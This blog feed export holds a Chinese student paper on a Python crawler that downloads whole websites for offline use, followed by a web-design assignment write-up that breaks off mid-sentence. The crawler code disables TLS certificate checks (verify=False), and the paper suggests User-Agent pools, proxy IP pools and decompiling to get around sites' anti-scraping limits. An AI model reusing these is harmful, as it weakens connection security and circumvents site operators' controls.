        <content type="html"><![CDATA[<h1><center>网站源代码下载器的设计与实现</center></h1>> **摘要：**随着时代的进步以及科技的发展，人们越来越多的需要高效地从互联网上获取所需的信息，然而其对网络的要求和一些站点人为的限制，却也制约了用户对网络信息的获取和保存。对此，针对于一项可以实现将网站数据便捷获取并长期保存的网站源代码下载器进行了学习研究设计开发，主要应用了爬虫技术通过伪装成客户端与服务器进行数据交互，实现数据采集。可视化网站源代码下载器将实现对用户输入站点的下载实现长期保存，便于用户访问。<p><strong>关键词：</strong> <code>计算机网络</code>   <code>网络爬虫</code>   <code>WxPython正则表达式</code>   <code>requests</code></p><h3 id="1-HTTP协议"><a href="#1-HTTP协议" class="headerlink" title="1.HTTP协议"></a>1.HTTP协议</h3><p>HTTP 报文是在应用程序之间发送的数据块,这些数据块将通过以文本形式的元信息开头，用于 HTTP 协议交互。请求端(客户端)的 HTTP 报文叫做请求报文，响应端(服务器端)的叫做响应报文。 HTTP 报文本身是由多行(用 CR+LF 作换行符)数据构成的字符串文本。（图1.1 Http报文格式）</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1656996197767.png"></p><center>图1.1 Http报文格式</center>### 2.网络爬虫<p>网络爬虫就是自动从互联网中定向或者不定项的采集信息的一种程序。网络爬虫通过伪装成客户端与服务器进行数据交互的，从而实现数据采集，搜索引擎，模拟操作等功能（图2.1 网络爬虫知识图谱）。网络爬虫大致可分为三大模块即，发送请求获取数据，解析数据与获取数据。</p><p>爬虫的第一个步骤是获取数据，就是对起始 URL 发送请求，以获取其返回的响应，值得注意的是，发送请求实质上是指发送请求报文的过程。其报文头部的内容广泛使用于反爬虫策略与抗反爬虫策略。</p><p>数据下载是数据爬取过程中的重要环节。执行数据下载之前首先需要对数据爬取对象网站进行全面地了解，包括此网站数据展示介质、网站背景、网站的组织结构及今后的发展等，在对爬取对象可能出现的展示形式（Web、PC 端应用、APP）进行分析后，才能确定要爬取的具体展现形式[5]</p><p>一个完整的爬虫应用不光涉及网络技术，在获取并下载数据后，还需要对数据进行分析，提取需要的信息，并对数据进行可视化分析和展示。</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1656996158776.png"></p><center>图2.1 网络爬虫知识图谱</center>#### 2.1 requests<p>requests库是基于<code>urllib</code>库，采用<code>Apache2 Licensed </code>开源协议编写的，基于其内置的urllib3，其允许程序发送HTTP/1.1请求，且不需要手动的为URL添加查询字串，也不需要对<strong>POST</strong>数据进行表单编码，可以轻易的向对应的网站发起请求，从而对网页数据进行获取，还可以获取服务器返回的响应内容和状态码。</p><h4 id="2-2-正则表达式"><a href="#2-2-正则表达式" class="headerlink" title="2.2 正则表达式"></a>2.2 正则表达式</h4><p>正则表达式是使用单个字符串来描述、匹配一系列符合某个句法规则的字符串，是一种匹配字符串的方法，通过一些特殊符号，实现快速查找、删除、替换某个特定字符串。正则表达式一般用于脚本编程与文本编辑器中，在本程序中通过python re库正则表达式匹配方法，实现对正确输入文本的匹配及对部分内容的批量替换。</p><h4 id="2-3-WxPython"><a href="#2-3-WxPython" class="headerlink" title="2.3 WxPython"></a>2.3 WxPython</h4><p>WxPython是一个开发桌面端图形界面的跨平台函数库，开发语言为Python，它是基于C++的函数库wxWidgets的封装的跨平台GUI工具。</p><h4 id="2-4-Beautiful-Soup"><a href="#2-4-Beautiful-Soup" class="headerlink" title="2.4 Beautiful Soup"></a>2.4 Beautiful Soup</h4><p>Beautiful Soup就是Python的一个HTML或XML的解析库，提供一些简单的、Python式的函数来处理导航、搜索、修改分析树等功能，主要用于将HTML标签转换为Python对象树，并通过解析文档为用户提供需要抓取的数据。</p><h4 id="2-5-抗反爬虫策略"><a href="#2-5-抗反爬虫策略" class="headerlink" title="2.5 抗反爬虫策略"></a>2.5 抗反爬虫策略</h4><p>随着反爬虫程序被研发利用来，越多的网站都有自己的反爬机制，抓取数据已经不像以前那么容易。</p><p>目前，大部分网站都希望正常的用户进行访问，不希望爬虫轻易抓取他们的网站。究其原因，爬虫一方面会给他们的网站带来无用的性能压力，另一方面爬虫会造成他们网站的数据被“盗取”，于是，这些网站开始制定相应的反爬虫策略。一般的反爬策略例如：设置单个IP在单位时间内不能请求次数超过阈值或者请求的频率高于他们认为的人为行为频率、请求参数中带有他们加密后的字段值等。</p><p>要解决网站反爬的问题，首先要知道自己被封的原因和对方的“封堵机制”，这样才能更有效地使用上面的措施解决问题。针对单个IP单位时间内不能请求超过阈值情况，我们需要更改自己的抗反爬策略，一般情况下可以使用User-Agent池、降低下载频率、使用代理IP池等方式解决 ；针对数据加密的情况，可以通过反编译进行解决。</p><h4 id="2-6-关于网络爬虫的法律问题"><a href="#2-6-关于网络爬虫的法律问题" class="headerlink" title="2.6 关于网络爬虫的法律问题"></a>2.6 关于网络爬虫的法律问题</h4><p>遵守Robots协议，此协议声明那些内容不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。 </p><p>不能造成对方服务器瘫痪，2021年颁布实施的《数据安全管理办法》规定网络运营者采取自动化手段访问收集网站数据，不得妨碍网站正常运行[5]</p><p>不能非法获利，不能涉及个人隐私采集的信息，属于公民个人信息的，有可能构成非法获取公民个人信息的违法行为，情节严重的，有可能构成“侵犯公民个人信息罪”因此爬虫开发者的道德和良知才是避免触碰法律底线的根本所在。</p><h3 id="3-设计方法及思路"><a href="#3-设计方法及思路" class="headerlink" title="3. 设计方法及思路"></a><strong>3.</strong> 设计方法及思路</h3><h4 id="3-1-问题分析"><a href="#3-1-问题分析" class="headerlink" title="3.1 问题分析"></a>3.1 问题分析</h4><p>网站源代码下载器这一程序设计的关键在于如何使用户更加便利的保存网络站点上的信息，实现在无互联网的情况下的长期保存。程序将在完成，发送请求获取数据，解析数据与获取数据这三大基本功能的前提下，实现将网页原始数据的加工处理。</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1656996442567.png"></p><h4 id="3-2-设计思路"><a href="#3-2-设计思路" class="headerlink" title="3.2 设计思路"></a>3.2 设计思路</h4><p>基于网络爬虫下实现网站源代码下载器的设计开发，在针对大量网站进行研究后，总结部分结论，不同类型站点网页设计人员对项目设计的方式差异性明显，部分站点可能因为开发时间和后期的修改，呈现出十分混乱的特点，这些都增加了网站源代码下载器的设计难度。针对以上特点，对网站源代码下载器的功能进行设计，利用正则匹配等方式尽可能保留站点原始样貌。</p><p>对于程序设计采用python语言，建立两大模块，即可视化客户端与网络爬虫程序，本项目的网络爬虫程序接近于聚焦网络爬虫，聚焦到特定主题目标网站进行爬取，包含页面爬取模块、无关链接过滤等功能。再对爬取到的信息进行提取和分析，最终能够运行实现网站源码下载器的开发。</p><h3 id="4-具体代码设计及运行"><a href="#4-具体代码设计及运行" class="headerlink" title="4. 具体代码设计及运行"></a>4. 具体代码设计及运行</h3><p>设置一个class类Frame，使用WxPython库的方法实现可视化程序的实现并提供后台接口（如图3.1 网络源代码下载器），通过输入事件监听与正则表达式对用户输入数据进行分析。在输入内容符合要求时通过后台网络爬虫，之后进行数据采集。实现网站源代码下载器的应用。（如图3.2 网站源码下载反馈）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"网站地址不能为空!"</span><span class="token punctuation">,</span> <span class="token string">"错误信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        match<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> match<span class="token punctuation">:</span>            download_img<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1656996468391.png" alt="1656996468391"></p><center>图4.1 网络源代码下载器</center>后台程序接收到可执行的信息后，对信息做出后续处理。对网页内各种资源标签进行匹配，将网页数据（如图片，CSS文件，JS文件）保存至本地，并将其转为相对路径，便于用户直接使用。（如图4.2 本地存储文件、图4.3 本地网页展示）<p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1656996532119.png" alt="1656996532119"></p><center>图4.2 本地存储文件</center>![1656996587781](C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1656996587781.png)<center>图4.3 本地网页展示</center>在程序的后台处理中依次实现了，发送请求获取数据，解析数据与获取数据请求获取数据，并对其进行解析：<pre class="line-numbers language-python" data-language="python"><code class="language-python">host <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">u'[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+\.?'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>Host <span class="token operator">=</span> <span class="token string">'https://'</span><span class="token operator">+</span> host<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>bsobj <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>a<span class="token punctuation">.</span>content<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span> <span class="token comment"># 将网页源码构造成BeautifulSoup对象，方便操作</span>a_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 获取网页中的所有a标签对象</span>script_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的script标签</span>link_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token comment"># 获取网页中所有的link标签</span>img_list <span class="token operator">=</span> bsobj<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对获取到的数据在运行空间暂存，程序对其进行分析，生成标准URL，再次转入数据获取函数，在数据获取完成后，对文件进行格式化保存，将通过数据解析的数据，以其在服务器的相对位置进行存储。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_file</span><span class="token punctuation">(</span>chdir_path<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> <span class="token string">'.png'</span><span class="token punctuation">,</span> <span class="token string">'webp'</span><span class="token punctuation">,</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'.gif'</span><span class="token punctuation">,</span> <span class="token string">'.bmp'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'images/'</span> <span class="token operator">+</span> filename <span class="token punctuation">,</span> <span class="token string">"wb+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'js'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'js/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">elif</span> filename<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'css'</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> <span class="token string">'css/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>chdir_path <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为便于用户后期的直接长期阅读，程序后台还通过re模块通过正则匹配将原程序Html文件及CSS中超链接路径匹配为相应的相对路径。</p><h3 id="5．总结"><a href="#5．总结" class="headerlink" title="5．总结"></a>5．总结</h3><p>本文使用Python程序设计软件设计开发了简单的源代码下载器，利用WxPython的有关知识，建立了可视化端口，为爬虫程序提供可用接口，基于网络爬虫的原理下，成功的设计出了程序，实现了网站源码下载器的开发。并且在正则表达式的支持下，将网页原始路径转化为相对路径，不会出现因防盗链和文件路径的不准确或者丢失的情况出现。实现了在没有互联网的情况之下数据的长期保存。</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><blockquote><p>[1] 朱荣.《python与大数据分析应用》.清华大学出版社.2021.3.P101-P107<br>[2] 谢希仁.《计算机网络》.电子工业出版社.2013.6.P35-P37、P115-P124、P238-P241<br>[3] 吴海燕,佟秋利《我国网络安全法律法规体系框架》.中国教育网络.2021.08 P66-P67<br>[4] 2021 Bad Bot Report [EB/OL]. <a href="https://www.imperva.com/resources/reports/Bad-Bot-Report">https://www.imperva.com/resources/reports/Bad-Bot-Report</a> 2021<br>[5] 孟宝灿,《Python网络爬虫应用探讨》广播电视信息 2022.03 P108-P110</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
            <tag> Python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年Web程序设计大作业</title>
      <link href="/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
      <url>/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写这个主要是我们，那个Web前段开发设计的课采用的是大作业的方式，正好今天我期末结束，任务基本完工，整理下今年做的一些东西。</p></blockquote><h2 id="绿动出行企业门户的设计与实现"><a href="#绿动出行企业门户的设计与实现" class="headerlink" title="绿动出行企业门户的设计与实现"></a>绿动出行企业门户的设计与实现</h2><p>[TOC]</p><h3 id="1-网站相关知识"><a href="#1-网站相关知识" class="headerlink" title="1.网站相关知识"></a>1.网站相关知识</h3><h4 id="1-1目录结构规范、各种标识符命名规范"><a href="#1-1目录结构规范、各种标识符命名规范" class="headerlink" title="1.1目录结构规范、各种标识符命名规范"></a>1.1目录结构规范、各种标识符命名规范</h4><p>建立一个好的前端应该具有一个好的目录结构，每个前端项目总是包含库、jQuery插件和大量的JavaScript脚本与CSS文件，以达到不同的目的和目标。我们需要将所有东西通过遵循一种模式或公约置入文件夹中，以此来保持清晰、整洁。这对我们而言是非常重要的</p><ol><li>整洁的结构：<ul><li>CSS（主文件夹）这个文件夹包含了所有CSS文件。例如index.css可以对应控制index.html文件</li><li>image/img 存放所有的图片文件：.png、.jpg、.jpeg、壁纸等。</li><li>JS (主文件夹) 存放.js文件 </li><li>media 存放多媒体文件  一般指视频与音频文件，在部分情况下可以分为多个媒体文件夹。</li></ul></li></ol><h4 id="1-2文件名命名规范"><a href="#1-2文件名命名规范" class="headerlink" title="1.2文件名命名规范"></a>1.2文件名命名规范</h4><p>文件名称统一用小写的英文字母、数字和下划线的组合，其中不得包含汉字、空格和特殊字符；命名原则的指导思想一是使得每一个成员能够方便的理解每一个文件的意义，二是当我们在文件夹中使用“按名称排例”的命令时，同一种大类的文件能够排列在一起，以便我们查找、修改、替换、计算负载量等等操作。</p><p>引文件统一使用index.htm index.html index.asp文件名（小写） 各子页命名的原则首先应该以栏目名的英语翻译取单一单词为名称例如本系统中已经完成的login.html（登录页面）,about.html(关于我们)</p><h4 id="1-3-HTML结构"><a href="#1-3-HTML结构" class="headerlink" title="1.3 HTML结构"></a>1.3 HTML结构</h4><p>HTML的全称为超文本标记语言，是一种标记语言。它包括一系列标签．通过这些标签可以将网络上的<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3/1009768">文档</a>格式统一，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC/5443630">文本</a>，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p><p>一、常见HTML元素</p><ol><li>盒子模型<ul><li>块级标签：<code>&lt;p&gt;/&lt;h1&gt;/&lt;table&gt;/&lt;ol&gt;/&lt;ul&gt;/&lt;form&gt;/&lt;div&gt;</code></li><li>内联标签：<code>&lt;a&gt;/&lt;input/&gt;/&lt;img/&gt;/&lt;sub&gt;/&lt;sup&gt;/&lt;textarea&gt;/&lt;span&gt;</code></li></ul></li><li>特殊字符：&lt;&gt; ×©</li><li>图像标签：<code>&lt;img src=&quot;&quot; width=&quot;&quot; height=&quot;&quot;/&gt;</code></li><li>表格：<code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code></li><li>表单：<code>&lt;form&gt;&lt;lable for=&quot;A&quot;&gt;&lt;/lable&gt;&lt;input type=””placeholder=”” name=”A” id=”A” pattern=””/&gt;&lt;/form&gt;</code></li><li>列表：<code>&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ol&gt;&lt;li&gt;&lt;/li&gt;&lt;/ol&gt;&lt;dl&gt;&lt;dt&gt;&lt;dt&gt;&lt;/dd&gt;&lt;/dd&gt;&lt;/dl&gt;</code></li><li>音频：<code>&lt;audio&gt;&lt;/audio&gt;</code></li><li>视频：<code>&lt;video&gt;&lt;/video&gt;</code></li><li>浮动框架：<code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ol><p>HTML5是构建Web内容的一种语言描述方式。HTML5是互联网的下一代标准，是构建以及呈现互联网内容的一种语言方式．被认为是互联网的核心技术之一。在2012年已经形成稳定版本。</p><ul><li>全新结构元素：<ul><li>头部标签：<code>&lt;header&gt;&lt;/header&gt;</code></li><li>导航栏标签：<code>&lt;nav&gt;&lt;/nav&gt;</code></li><li>底部标签：<code>&lt;footer&gt;&lt;/footer&gt;</code></li></ul></li></ul><h4 id="1-4-CSS层叠样式表"><a href="#1-4-CSS层叠样式表" class="headerlink" title="1.4 CSS层叠样式表"></a>1.4 CSS层叠样式表</h4><p>层叠样式表(Cascading Style Sheets)是一种用来表现HTML或XML等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。</p><p>一、CSS3</p><p>CSS3是CSS层叠样式表技术的升级版本，于1999年开始制订，2001年5月23日W3C完成了CSS3的工作草案，主要包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块</p><blockquote><p>使用方式：包括内联方式，嵌入方式，链接方式，导入方式</p></blockquote><p>内联方式指的是直接在 HTML 标签中的 style 属性中添加 CSS。内联方式引入 CSS 代码会导致 HTML 代码变得冗长，且使得代码难以维护。</p><p>嵌入方式的 CSS 只对当前的网页有效，当多个页面需要引入相同的 CSS 代码时，这样写会导致代码冗余，也不利于维护。</p><p>链接方式这是最常见的也是最推荐的引入 CSS 的方式。使用这种方式，所有的 CSS 代码只存在于单独的 CSS 文件中，所以具有良好的可维护性。并且所有的 CSS 代码只存在于 CSS 文件中，CSS 文件会在第一次加载时引入，以后切换页面时只需加载 HTML 文件即可。</p><p>在本次的项目中，由于导师所做要求，暨整个网站有一外部CSS文件控制所有页面的统一样式，每个页面的个别样式采用内部CSS。所以同时采用了以上三种使用方式。</p><ul><li>CSS选择器：<ul><li>标签选择器（全局）、类选择器（最多）、id选择器（锚点）</li><li>通配符选择器</li><li>并集选择器、交集选择器、后代选择器</li><li>伪类选择器 :first-child,:last-child,nth-of-type(n)</li><li>伪元素选择器 :link :hover :visited</li></ul></li><li>字体样式：<ul><li>字体大小：font-size</li><li>字体：font-family</li><li>字体粗细：font-weight</li></ul></li><li>文本外观<ul><li>文本颜色：color</li><li>文本行间距：line-height</li><li>文本对齐方式：text-align</li><li>首行缩进：text-indent:2em;</li><li>标识文本溢出：text-overflow:ellipsis;</li><li>文本格式：text-decoration: underline;</li></ul></li><li>背景：<ul><li>背景颜色：background-color</li><li>背景图片：background-image</li><li>背景图像平铺：background-repeat:no-repeat;</li><li>背景图像位置：background-position:center center;</li><li>背景图像固定：background-attachment:fixed;</li><li>背景图像大小：background-size:cover/ % %;</li></ul></li><li>表单：<ul><li>接收并处理表单数据的服务器程序的地址：action=”#”</li><li>提交方式：method=”post”</li><li>表单名称：name=””</li><li>表单控件form、select控件、textarea控件</li></ul></li><li>视频/音频：<ul><li>自动播放：autoplay:autoplay;</li><li>结束重新开始：loop:loop;</li><li>缓冲不足连接一个图像：poster:url();</li><li>静音播放：muted</li><li>显示按键：controls:controls;</li></ul></li><li>CSS媒体查询<ul><li>媒体查询旨在为不同的设备（显示器、平板电脑、手机等）定义不同的样式规则，使用媒体查询是一种流行的技术，可以向台式机、笔记本电脑、平板电脑和手机（例如 iPhone 和 Android 手机）提供定制的样式表。</li></ul></li></ul><h4 id="1-5-JavaScript和JQuery动态"><a href="#1-5-JavaScript和JQuery动态" class="headerlink" title="1.5 JavaScript和JQuery动态"></a>1.5 JavaScript和JQuery动态</h4><p>JavaScript（简称“JS”）是一种具有函数优先的轻量级，解释型或即时编译型的高级编程语言。虽然它是作为开发web页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。</p><p>jQuery 是一个 JavaScript 库，也是一个JS文件。 JQ中封装实现了很多方法，让使用变得更加简单不再像js那样需要使用大量的方法调用。但JQ也只是实现了一些方法，还有些没有实现，因此能够使用JQ是实现的，JS都能做，但是能够用JS做的，JQ不一定能够实现。</p><h3 id="2-网站的设计与实现"><a href="#2-网站的设计与实现" class="headerlink" title="2.网站的设计与实现"></a>2.网站的设计与实现</h3><h4 id="2-1-index-html"><a href="#2-1-index-html" class="headerlink" title="2.1 index.html"></a>2.1 index.html</h4><ul><li><p>头部和导航栏：</p><p>在整个项目中Header及footer的内容都是一致的，增加了代码的复用性，又增强了整个网页格式的统一。</p><p>在index页面中，存在整个项目唯一的nav元素，主要原因在于在实现过程中，我将Header元素用作链接整体，就淡化了<code>&lt;nav&gt;</code>标签的作用。</p><p>可以注意到在第二行右侧，出现了几个圆形图标，在这里是引入iconfont.ttf图标文字库代替图标图片。因为目前为止项目后端并没有完成，班列定制，APP下载等功能并没有进行开发。</p></li><li><p>banner块布局</p><p>在这一块引入了内嵌的JS代码做了一个简单地JS动态窗口，具体体现就是在banner块的中央位置插入了我一句比较喜欢的名言，也是我博客上所展示的”从来没有真正的绝境, 只有心灵的迷途”,”Never really desperate, only the lost of the soul”。</p><p>Banner块的底部通过CSS修饰，通过button按钮，页内超连接，与img图片属性制作出一个向下开启绿色生活的跳转样式。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/1.png" style="zoom: 67%;" /><center>2.1 绿动出行主业</center></li><li><p>主体DIV块布局</p><p>该页面主题我采用了三列的弹性盒，在左右两栏通过CSS的:hover 选择器设置，鼠标悬停效果和动画，在鼠标选中时，通过css动画将原本置于页面左右两侧，背景和字体颜色都通过RGBA设为透明的两个块，通过transition: all 0.5s ease-in 0s;以及改变透明度的方式呈现出动画效果</p><p>中间列，通过JS与JQ实现了一个多图轮播机制，通过index.js代码进行控制实现页面的展示效果的增强。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/2.png" style="zoom:67%;" /><center>2.2 多图轮播页面</center></li><li><p>Footer页面设置</p><p>在footer页面展示稍微少一些，这边我实际上只是采用了表格和图片进行了样式修饰，没有太多的其他效果。</p></li><li><p>全页效果</p><p>页面采用了css3媒体查询的方式，在窗口大小过小时整体会呈现出一个单列布局（图2.1-3 在手机端单列布局的展示），采用<code>&lt;source&gt;</code>标签进行背景音频的播放。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/3.png"></p><center>2.3 媒体查询下效果</center></li></ul><h4 id="2-2-project-html"><a href="#2-2-project-html" class="headerlink" title="2.2 project.html"></a>2.2 project.html</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/4.png" style="zoom:67%;" /><center>2.4 project.html</center>这个页面因为一些对老师要求的理解失误，这个页面便采用的是外部链接样式+内部CSS样式上，通过cards和card标签为下方图片增加卡片效果，同时也采用了一些简单的媒体查询，会在屏幕大小较小是将其改为单列图片。<h4 id="2-3-about-html"><a href="#2-3-about-html" class="headerlink" title="2.3 about.html"></a>2.3 about.html</h4><p>这一个页面也是整体多是CSS做的显示内容，通过背景和容器两层标签的使用，在container块中依次通过居中，设置内边距与外边距完成整体的样式设计。使背景正好覆盖整个页面的上半部分，文字和视频部分居中。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/5.png" style="zoom:67%;" /><center>图2.5 关于我们页面</center>#### 2.4 login.html<p>这一个登录和注册页面其实并没有采用表单，只是通过修饰的两列输入栏，通过内置的js代码进行匹配，当鼠标点击对应位置时js代码段对content标签进行验证，将其改为对应的显示。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/07/03/Web%E5%A4%A7%E4%BD%9C%E4%B8%9A/6.png" style="zoom:67%;" /><center>图2.6 登录页面</center>#### 2.5 information_acquisition.html<p>这个页面实际上是最初没有的，到现在也跟整个项目有些格格不入，在这个页面内，通过表格和表单嵌套使用做出整体美观的显示，之后通过HTML代码和JS代码进行输入验证。</p><ul><li><p>HTML验证:</p><p>由于HTML5有很多全新的表单控件，比如input type=”email” ，在这些控件在进行HTML代码会自动对其进行合法性验证，同时在不具备自动验证的块，通过设置正则表达式完成对块数据的验证如：pattern=”^[\u4e00-\u9fa5]{0,}$”这就是一个判断是否为中文的验证。</p></li><li><p>JS输入验证：</p><p>因为是临时赶工做出来的页面，我对其要求也有所降低，JS验证是通过在每个需要进行验证的输入栏后面设置一个空的块，块里不赋值，在点击注册后表单通过onsubmit=”return validateForm()”将数据传递给页面内的js 